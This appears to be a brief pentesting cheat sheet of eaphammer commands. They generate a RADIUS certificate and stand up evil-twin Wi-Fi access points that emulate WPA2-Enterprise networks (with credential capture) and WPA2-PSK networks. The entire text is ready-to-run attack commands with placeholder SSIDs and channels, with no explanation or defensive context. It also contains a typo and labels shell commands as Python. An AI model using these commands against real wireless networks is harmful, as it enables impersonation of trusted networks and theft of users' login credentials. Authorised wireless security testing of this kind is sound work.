Generating certificate for Radius 

~~~python
python3 ./eaphammer --certwizard
~~~

Emulating WPA2 Radius

~~~python
python3 ./eaphammer --interface wlan0 --essid=<SSID_to_emulate> --channel=<channel> --creds --wpa-version=2
~~~

Emulating WPA2 PSK

~~~python
python3 ./eaphammer --interface wlan0 --essid=<SSOD_to_emulate> --channel=<channel> --wpa-passphrase="passphrase_to_use" --wpa-version=2